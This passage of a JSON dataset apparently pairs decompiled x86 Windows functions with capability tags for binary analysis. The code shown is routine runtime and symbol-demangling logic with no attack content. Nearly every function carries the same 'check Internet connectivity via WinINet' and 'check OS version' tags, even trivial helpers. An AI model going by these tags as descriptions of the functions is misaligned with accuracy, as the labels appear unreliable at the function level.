        "decompiled_code": "\nuint __cdecl fcn.00402ca2(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t in_ECX;\n    uint32_t var_4h;\n    \n    piVar2 = *(in_ECX + 0xc);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.00403a35();\n        *(in_ECX + 0xc) = piVar2;\n    }\n    iVar1 = *piVar2;\n    *piVar2 = 0;\n    var_4h = 0;\n    uVar3 = fcn.00403675(*(in_ECX + 0x10) + -2, &var_4h, 10);\n    *arg_8h = uVar3;\n    piVar4 = *(in_ECX + 0xc);\n    if (piVar4 == NULL) {\n        piVar4 = fcn.00403a35();\n        *(in_ECX + 0xc) = piVar4;\n    }\n    if ((*piVar4 == 0x22) || (var_4h < *(in_ECX + 0x10))) {\n        uVar3 = 0;\n    }\n    else {\n        *(in_ECX + 0x10) = var_4h;\n        uVar3 = 1;\n    }\n    if ((*piVar2 == 0) && (iVar1 != 0)) {\n        *piVar2 = iVar1;\n    }\n    return uVar3;\n}\n",
        "token_count": 355
    },
    "00402cde": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00402cde(int32_t **arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t **ppiVar3;\n    uint arg_8h_00;\n    uint uVar4;\n    uint var_a4h;\n    uint var_78h;\n    uint var_4ch;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    uint var_1h;\n    \n    uVar4 = *0x57444c;\n    if ((**0x574458 == '?') && ((*0x574458)[1] == '$')) {\n        var_4ch = 0xffffffff;\n        var_78h = 0xffffffff;\n        var_a4h = 0xffffffff;\n        var_14h = *0x574450;\n        var_18h = *0x574454;\n        cVar2 = '\\0';\n        *0x574450 = &var_78h;\n        *0x574454 = &var_a4h;\n        var_10h = *0x57444c;\n        var_1h._0_1_ = '\\0';\n        *0x57444c = &var_4ch;\n        if ((*0x574458)[2] == '?') {\n            *0x574458 = *0x574458 + 3;\n            ppiVar3 = fcn.00402dc4(&var_20h, 1, &var_1h);\n            cVar2 = var_1h;\n        }\n        else {\n            *0x574458 = *0x574458 + 2;\n            ppiVar3 = fcn.0040295a(&var_20h, 1, 1);\n        }\n        var_ch = *ppiVar3;\n        var_8h = ppiVar3[1];\n        if (var_ch == NULL) {\n            *0x574464 = 1;\n        }\n        if (cVar2 == '\\0') {\n            fcn.00403d55(0x3c);\n            arg_8h_00 = fcn.00403f08(&var_20h);\n            fcn.00402eeb(arg_8h_00);\n            if (var_ch != NULL) {\n                pcVar1 = *(*var_ch + 8);\n                (**0x578000)();\n                cVar2 = (*pcVar1)();\n                uVar4 = var_10h;\n                if (cVar2 == '>') {\n                    fcn.00403d55(0x20);\n                    uVar4 = var_10h;\n                }\n            }\n            fcn.00403d55(0x3e);\n            if ((arg_ch != '\\0') && (**0x574458 != '\\0')) {\n                *0x574458 = *0x574458 + 1;\n            }\n        }\n        *0x574450 = var_14h;\n        *0x574454 = var_18h;\n        *0x57444c = uVar4;\n        *arg_8h = var_ch;\n        arg_8h[1] = var_8h;\n        return;\n    }\n    arg_8h[1] = NULL;\n    *arg_8h = NULL;\n    *(arg_8h + 1) = 2;\n    return;\n}\n",
        "token_count": 790
    },
    "00402d15": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00402d15(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint arg_8h, uint arg_ch, uint noname_19, uint noname_20, \n            uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_40h;\n    uint *var_3ch;\n    uint *var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_40h_2;\n    code *pcStack64;\n    uint32_t uStack60;\n    uint uStack56;\n    uint *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uchar *var_20h_2;\n    int32_t var_1ch_2;\n    uint *var_18h;\n    uint var_14h;\n    code *var_10h;\n    code *var_ch;\n    uint var_8h;\n    code *var_4h;\n    \n    var_20h_2 = &stack0xfffffffc;\n    puStack40 = &stack0xffffffb8;\n    if (var_3ch == 0x123) {\n        *var_38h = 0x488f8f;\n        var_8h = 1;\n    }\n    else {\n        pcStack64 = fcn.0048915f;\n        uStack60 = *0x571ca8 ^ &fcn.00402d15::var_40h_2;\n        uStack56 = var_2ch;\n        puStack52 = var_38h;\n        uStack48 = var_28h;\n        uStack44 = var_24h;\n        var_1ch_2 = 0;\n        var_40h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.00402d15::var_40h_2;\n        uVar1 = fcn.004064fb(*var_3ch);\n        *var_3ch = uVar1;\n        var_8h = 1;\n        var_18h = var_3ch;\n        var_14h = var_34h;\n        iVar2 = fcn.00402b26();\n        var_4h = *(iVar2 + 8);\n        var_ch = *0x578000;\n        (**0x578000)();\n        var_10h = var_4h;\n        (*var_4h)(*var_3ch, &fcn.00402d15::var_18h);\n        var_8h = 0;\n        if (var_1ch_2 == 0) {\n            *in_FS_OFFSET = var_40h_2;\n        }\n        else {\n            *var_40h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_40h_2;\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 788
    },
    "00402d47": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402d47(uint *arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    if (0 < arg_8h[1]) {\n        fcn.00405a3d(*arg_8h, arg_8h[1]);\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "00402d51": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402d51(ushort *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.004028c4(in_ECX + 0x464 + uVar1 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 300
    },
    "00402d6a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402d6a(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t arg_8h_00;\n    \n    if ((arg_ch == 0) || (arg_8h == NULL)) {\n        arg_ch = 0;\n    }\n    else {\n        arg_8h_00 = *arg_8h;\n        if (arg_8h_00 != arg_ch) {\n            *arg_8h = arg_ch;\n            fcn.00402ec8(arg_ch);\n            if (((arg_8h_00 != 0) && (fcn.004053da(arg_8h_00),  *(arg_8h_00 + 0xc) == 0)) && (arg_8h_00 != 0x571e78)) {\n                fcn.0040697e(arg_8h_00);\n            }\n        }\n    }\n    return arg_ch;\n}\n",
        "token_count": 210
    },
    "00402d83": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402d83(int32_t *param_1)\n\n{\n    uint *puVar1;\n    \n    if (*param_1 == 0) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 84
    },
    "00402dc4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t ** __cdecl fcn.00402dc4(int32_t **arg_8h, uint arg_ch, uchar *arg_10h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    code *pcVar3;\n    char cVar4;\n    uint uVar5;\n    int32_t **ppiVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t *piVar9;\n    uint8_t *puVar10;\n    int32_t *piVar11;\n    uint var_28h;\n    char *var_20h;\n    int32_t *var_1ch;\n    int32_t *var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    iVar8 = **0x574458;\n    puVar10 = *0x574458 + 1;\n    piVar11 = NULL;\n    var_8h = NULL;\n    piVar9 = NULL;\n    var_4h = NULL;\n    var_18h = NULL;\n    var_14h = NULL;\n    // switch table (22 cases) at 0x49087a\n    switch(iVar8) {\n    case 0x4a:\n    case 0x4b:\n    case 0x4c:\n    case 0x4d:\n    case 0x4e:\n    case 0x4f:\n    case 0x50:\n    case 0x51:\n    case 0x52:\n    case 0x53:\n    case 0x54:\n    case 0x55:\n    case 0x56:\n    case 0x57:\n    case 0x58:\n    case 0x59:\n    case 0x5a:\ncode_r0x004903a6:\n        iVar8 = **0x574458 * 8 + 0x554ad0;\n        *0x574458 = puVar10;\ncode_r0x00490733:\n        fcn.004022f7(iVar8);\n        if (piVar11 == NULL) goto code_r0x0049034d;\n        piVar9 = var_4h;\n        piVar11 = var_8h;\n        puVar1 = *0x574458;\n        if (var_8h != NULL) {\n            piVar9 = var_4h | 0x200;\n        }\n        break;\n    case 0x5b:\n    case 0x5c:\n    case 0x5d:\n    case 0x5e:\n        goto code_r0x004901ff;\n    case 0x5f:\n        iVar8 = *puVar10;\n        puVar1 = *0x574458 + 2;\n        puVar10 = puVar1;\n    // switch table (24 cases) at 0x49089e\n        switch(iVar8) {\n        case 0x50:\n            puVar10 = *0x574458 + 1;\n            *0x574458 = puVar1;\n            fcn.004022f7(*puVar10 * 8 + 0x554bf0);\n            ppiVar6 = fcn.00402dc4(&var_20h, 0, NULL);\n            var_18h = *ppiVar6;\n            var_14h = ppiVar6[1];\n            puVar10 = *0x574458;\n            if ((var_18h == NULL) || ((var_14h & 0x400) == 0)) {\ncode_r0x0049071b:\n                *0x574458 = puVar10;\n                fcn.004053b7(arg_8h, &var_18h);\n                return arg_8h;\n            }\n            break;\n        case 0x51:\n            goto code_r0x00490759;\n        case 0x52:\n            puVar10 = *0x574458 + 1;\n            *0x574458 = puVar1;\n            fcn.004022f7(*puVar10 * 8 + 0x554bf0);\n            if (**0x574458 == 0) {\n                fcn.004062fd(arg_8h, 1);\n                return arg_8h;\n            }\n            uVar7 = **0x574458 - 0x30;\n            puVar10 = *0x574458;\n            if ((-1 < uVar7) && (uVar7 < 5)) {\n                fcn.004022f7(uVar7 * 8 + 0x554f30);\n                uVar2 = **0x574458;\n                puVar10 = *0x574458 + 1;\n                if (uVar2 == 0x30) {\n                    *0x574458 = puVar10;\n                    fcn.00404c8c(&var_20h, 0);\n                    var_10h = var_20h;\n                    var_ch = var_1ch;\n                    fcn.00403d55(0x20);\n                    fcn.004053b7(&var_28h, &var_8h);\n                    puVar10 = *0x574458;\n                }\n                else {\n                    if (uVar2 == 0x31) {\n                        var_10h = var_8h;\n                        var_ch = var_4h;\n                        *0x574458 = puVar10;\n                        fcn.00402eeb(&var_18h);\n                        fcn.0040632f(&var_20h);\n                        uVar5 = fcn.0040330f(&var_18h, 0x2c);\n                        fcn.00402eeb(uVar5);\n                        fcn.0040632f(&var_20h);\n                        uVar5 = fcn.0040330f(&var_18h, 0x2c);\n                        fcn.00402eeb(uVar5);\n                        fcn.0040632f(&var_20h);\n                        uVar5 = fcn.0040330f(&var_18h, 0x2c);\n                        fcn.00402eeb(uVar5);\n                        fcn.0040358a(&var_20h, 0);\n                        uVar5 = fcn.0040330f(&var_18h, 0x29);\n                        fcn.00402eeb(uVar5);\n                        fcn.0040330f(arg_8h, 0x27);\n                        return arg_8h;\n                    }\n                    if (((uVar2 != 0x32) && (uVar2 != 0x33)) && (puVar1 = *0x574458,  uVar2 != 0x34))\n                    goto code_r0x00490314;\n                }\n                goto code_r0x0049071b;\n            }\n            break;\n        case 0x55:\n        case 0x56:\n            iVar8 = (*0x574458)[1] * 8 + 0x554bf0;\n            *0x574458 = puVar1;\n            goto code_r0x00490733;\n        case 0x57:\n        case 0x5a:\n        case 0x5b:\n        case 0x5c:\n        case 0x5d:\n        case 0x5e:\n            break;\n        case 0x5f:\n            puVar10 = *0x574458 + 3;\n    // switch table (14 cases) at 0x4908d2\n            switch(*puVar1) {\n            case 0x41:\n            case 0x42:\n            case 0x43:\n            case 0x44:\n            case 0x47:\n            case 0x48:\n            case 0x49:\n            case 0x4a:\n            case 0x4c:\n            case 0x4d:\n                iVar8 = (*0x574458)[2] * 8 + 0x554cb8;\n                *0x574458 = puVar10;\n                goto code_r0x00490465;\n            case 0x45:\n            case 0x46:\n                puVar1 = *0x574458 + 2;\n                *0x574458 = puVar10;\n                fcn.00402d47(*puVar1 * 8 + 0x554cb8);\n                if (**0x574458 == 0x3f) {\n                    uVar5 = fcn.00401d52(&var_28h);\n                    fcn.00402eeb(uVar5);\n                    if (**0x574458 == 0x40) {\n                        *0x574458 = *0x574458 + 1;\n                    }\n                }\n                else {\n                    uVar5 = fcn.00401460(&var_28h);\n                    fcn.00402eeb(uVar5);\n                }\n                var_20h = 0x5557ac;\n                var_1ch = 0x2;\n                fcn.00405d71(&var_20h);\n                goto code_r0x00490806;\n            case 0x4b:\n                puVar1 = *0x574458 + 2;\n                *0x574458 = puVar10;\n                uVar7 = fcn.00402d47(*puVar1 * 8 + 0x554cb8);\n                while( true ) {\n                    uVar2 = **0x574458;\n                    if (uVar2 == 0) break;\n                    if (uVar2 == 0x40) {\n                        *0x574458 = *0x574458 + 1;\n                        break;\n                    }\n                    *0x574458 = *0x574458 + 1;\n                    uVar7 = fcn.00403d55(uVar7 & 0xffffff00 | uVar2);\n                }\ncode_r0x00490806:\n                *arg_8h = var_18h;\n                var_ch = var_14h;\ncode_r0x00490292:\n                arg_8h[1] = var_ch;\n                return arg_8h;\n            case 0x4e:\n                *0x574458 = *0x574458 + 4;\n                puVar10 = *0x574458;\n                if (*puVar10 == 0x32) {\n                    fcn.004068e3(arg_8h);\n                    return arg_8h;\n                }\n            }\n            break;\n        default:\n            if (iVar8 != 0x47) {\n                if (iVar8 < 0x39) {\n                    if (iVar8 == 0x38) {\ncode_r0x0049045a:\n                        iVar8 = (*0x574458)[1] * 8 + 0x554c28;\n                        *0x574458 = puVar1;\n                        goto code_r0x00490465;\n                    }\n                    if (iVar8 < 0x34) {\n                        if (iVar8 != 0x33) {\n                            if (iVar8 == 0) {\n                                puVar1 = *0x574458 + 1;\ncode_r0x00490314:\n                                *0x574458 = puVar1;\n                                fcn.004017df(1);\n                                return arg_8h;\n                            }\n                            if (((iVar8 != 0x30) && (iVar8 != 0x31)) && (iVar8 != 0x32)) break;\n                        }\n                    }\n                    else if (((iVar8 != 0x34) && (iVar8 != 0x35)) && (iVar8 != 0x36)) {\n                        if (iVar8 != 0x37) break;\n                        goto code_r0x0049045a;\n                    }\n                    iVar8 = (*0x574458)[1] * 8 + 0x554c28;\n                    *0x574458 = puVar1;\n                    goto code_r0x00490344;\n                }\n                if (iVar8 < 0x44) {\n                    if (iVar8 == 0x43) {\n                        *0x574458 = puVar1;\n                        fcn.00403535(&var_18h, 0);\n                        var_4h = var_14h | 0x1000;\n                        var_8h = var_18h;\ncode_r0x00490300:\n                        *arg_8h = var_8h;\n                        arg_8h[1] = var_4h;\n                        return arg_8h;\n                    }\n                    if (iVar8 == 0x39) {\n                        puVar10 = *0x574458 + 1;\n                        *0x574458 = puVar1;\n                        fcn.00402d47(*puVar10 * 8 + 0x554c28);\n                        var_4h = var_14h | 0x8000;\n                        var_8h = var_18h;\n                        goto code_r0x00490300;\n                    }\n                    if (iVar8 == 0x3f) {\n                        *0x574458 = *0x574458 + 3;\n                        if (*puVar1 != 0) {\n                            if (*puVar1 != 0x30) {\n                                arg_8h[1] = NULL;\n                                *(arg_8h + 1) = 2;\n                                *arg_8h = NULL;\n                                return arg_8h;\n                            }\n                            fcn.00403535(&var_18h, 1);\n                            *arg_8h = var_18h;\n                            arg_8h[1] = var_14h | 0x1000;\n                            return arg_8h;\n                        }\n                        goto code_r0x00490314;\n                    }\n                    iVar8 = iVar8 + -0x40;\n                }\n                else {\n                    iVar8 = iVar8 + -0x44;\n                    if (iVar8 == 0) goto code_r0x0049049b;\n                }\n                if ((iVar8 != 1) && (iVar8 != 2)) break;\n            }\n        case 0x48:\n        case 0x49:\n        case 0x4a:\n        case 0x4b:\n        case 0x4c:\n        case 0x4d:\n        case 0x4e:\n        case 0x4f:\n        case 0x53:\n        case 0x54:\n        case 0x58:\n        case 0x59:\ncode_r0x0049049b:\n            iVar8 = (*0x574458)[1] * 8 + 0x554bf0;\n            *0x574458 = puVar1;\ncode_r0x00490465:\n            fcn.00402d47(iVar8);\n            return arg_8h;\n        }\ncode_r0x004901ff:\n        *0x574458 = puVar10;\n        arg_8h[1] = NULL;\n        *(arg_8h + 1) = 2;\n        goto code_r0x00490209;\n    default:\n        if (iVar8 == 0x49) goto code_r0x004903a6;\n        if (0x38 < iVar8) {\n            if (iVar8 < 0x45) {\n                if (iVar8 != 0x44) {\n                    if (iVar8 == 0x39) goto code_r0x00490339;\n                    if (iVar8 != 0x41) {\n                        iVar8 = iVar8 + -0x42;\n                        if (iVar8 != 0) goto code_r0x0049039d;\n                        piVar11 = 0x1;\n                    }\n                }\n            }\n            else if (((iVar8 != 0x45) && (iVar8 != 0x46)) && (iVar8 = iVar8 + -0x47,  iVar8 != 0)) {\ncode_r0x0049039d:\n                if (iVar8 != 1) goto code_r0x004901ff;\n            }\n            goto code_r0x004903a6;\n        }\n        if (iVar8 != 0x38) {\n            if (iVar8 < 0x34) {\n                if (iVar8 != 0x33) {\n                    puVar1 = *0x574458;\n                    if (iVar8 == 0) goto code_r0x00490314;\n                    if ((iVar8 == 0x30) || (iVar8 = iVar8 + -0x31,  iVar8 == 0)) {\n                        var_ch = NULL;\n                        var_10h = NULL;\n                        if (arg_ch != '\\0') {\n                            *0x574458 = puVar10;\n                            uVar5 = fcn.00403f08(&var_20h);\n                            uVar5 = fcn.00402eb4(&var_18h, 0x3c, uVar5);\n                            fcn.00402eeb(uVar5);\n                            if (var_10h != NULL) {\n                                pcVar3 = *(*var_10h + 8);\n                                (**0x578000)();\n                                cVar4 = (*pcVar3)();\n                                if (cVar4 == '>') {\n                                    fcn.00403d55(0x20);\n                                }\n                            }\n                            fcn.00403d55(0x3e);\n                            if (arg_10h != NULL) {\n                                *arg_10h = 1;\n                            }\n                            if (**0x574458 == 0) {\n                                *arg_8h = var_10h;\n                                goto code_r0x00490292;\n                            }\n                            puVar10 = *0x574458 + 1;\n                        }\n                        piVar9 = var_10h;\n                        *0x574458 = puVar10;\n                        ppiVar6 = fcn.0040295a(&var_20h, 0, 0);\n                        var_8h = *ppiVar6;\n                        var_4h = ppiVar6[1];\n                        *0x574458 = puVar10;\n                        if ((var_8h != NULL) && (puVar10[-1] == 0x31)) {\n                            ppiVar6 = fcn.00402eb4(&var_20h, 0x7e, &var_8h);\n                            var_8h = *ppiVar6;\n                            var_4h = ppiVar6[1];\n                        }\n                        if (piVar9 != NULL) {\n                            fcn.00402eeb(&var_10h);\n                        }\n                        goto code_r0x00490300;\n                    }\ncode_r0x004901f6:\n                    if (iVar8 != 1) goto code_r0x004901ff;\n                }\n            }\n            else if (((iVar8 != 0x34) && (iVar8 != 0x35)) && (iVar8 = iVar8 + -0x36,  iVar8 != 0))\n            goto code_r0x004901f6;\n        }\ncode_r0x00490339:\n        iVar8 = **0x574458 * 8 + 0x554b08;\n        *0x574458 = puVar10;\ncode_r0x00490344:\n        fcn.004022f7(iVar8);\ncode_r0x0049034d:\n        piVar9 = var_4h;\n        piVar11 = var_8h;\n        puVar1 = *0x574458;\n        if (var_8h != NULL) {\n            var_20h = \"operator\";\n            var_1ch = 0x8;\n            fcn.00402d47(&var_20h);\n            fcn.004053b7(&var_20h, &var_8h);\n            piVar9 = var_1ch;\n            piVar11 = var_20h;\n            puVar1 = *0x574458;\n        }\n    }\ncode_r0x00490759:\n    *0x574458 = puVar1;\n    arg_8h[1] = piVar9;\ncode_r0x00490209:\n    *arg_8h = piVar11;\n    return arg_8h;\n}\n",
        "token_count": 4440
    },
    "00402e0f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402e0f(char **arg_8h, char **arg_ch)\n\n{\n    char *pcVar1;\n    char cVar2;\n    char *arg_8h_00;\n    char *pcVar3;\n    char *arg_8h_01;\n    \n    if ((*(arg_8h + 1) == '\\0') || (pcVar3 = *arg_8h,  pcVar3 == NULL)) {\n        *arg_ch = *arg_8h;\n        *(arg_ch + 1) = 0;\n    }\n    else {\n        pcVar1 = pcVar3 + 1;\n        do {\n            cVar2 = *pcVar3;\n            pcVar3 = pcVar3 + 1;\n        } while (cVar2 != '\\0');\n        arg_8h_00 = fcn.00401596(pcVar3 + (1 - pcVar1));\n        arg_8h_01 = arg_8h_00;\n        if (arg_8h_00 != NULL) {\n            fcn.0040605a(arg_8h_00, pcVar3 + (1 - pcVar1), *arg_8h);\n            arg_8h_01 = NULL;\n            *arg_ch = arg_8h_00;\n            *(arg_ch + 1) = 1;\n        }\n        fcn.00404179(arg_8h_01);\n    }\n    return;\n}\n",
        "token_count": 319
    },
    "00402e5a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00402e5a(void)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    \n    uVar2 = 0;\n    uVar1 = fcn.00401adc();\n    if (uVar1 == 1) {\n        uVar1 = fcn.004ca0af();\n        if (uVar1 != 0) {\n            uVar1 = fcn.004ca0cf();\n            if (uVar1 != 0) {\n                uVar2 = 1;\n            }\n        }\n    }\n    return uVar1 & 0xffffff00 | uVar2;\n}\n",
        "token_count": 141
    },
    "00402e7d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00402e7d(uint32_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        uVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            uVar3 = fcn.004037ce();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00405fec(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        uVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = uVar1;\n    arg_8h[1] = 0;\n    return 1;\n}\n",
        "token_count": 334
    },
    "0041f820": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041f820(int32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0040687a();\n    if (arg_8h != 0) {\n        fcn.00401ebf(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 95
    },
    "00402eaa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00402eaa(uint32_t *param_1, int32_t param_2, uint32_t param_3)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    int32_t iStack24;\n    uint32_t *puStack20;\n    \n    puStack20 = param_1;\n    iStack24 = param_2;\n    uStack28 = param_3;\n    uStack36 = 0x48b190;\n    uStack40 = *in_FS_OFFSET;\n    uStack32 = *0x571ca8 ^ &uStack40;\n    *in_FS_OFFSET = &uStack40;\n    while( true ) {\n        uVar2 = *(param_2 + 0xc);\n        if ((uVar2 == 0xfffffffe) || ((param_3 != 0xfffffffe && (uVar2 <= param_3)))) break;\n        puVar1 = (*(param_2 + 8) ^ *param_1) + 0x10 + uVar2 * 0xc;\n        *(param_2 + 0xc) = *puVar1;\n        if (puVar1[1] == 0) {\n            uStack40 = 0x101;\n            fcn.00405f88();\n            fcn.00403c6f();\n        }\n    }\n    *in_FS_OFFSET = uStack40;\n    return;\n}\n",
        "token_count": 341
    },
    "00402eb9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402eb9(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    in_ECX[1] = 0;\n    *(in_ECX + 1) = arg_8h;\n    if (arg_8h == 1) {\n        iVar1 = fcn.0040493a(1);\n        *in_ECX = iVar1;\n        if (iVar1 == 0) {\n            *(in_ECX + 1) = 3;\n        }\n    }\n    else {\n        *in_ECX = 0;\n    }\n    return;\n}\n",
        "token_count": 143
    },
    "00402ec8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
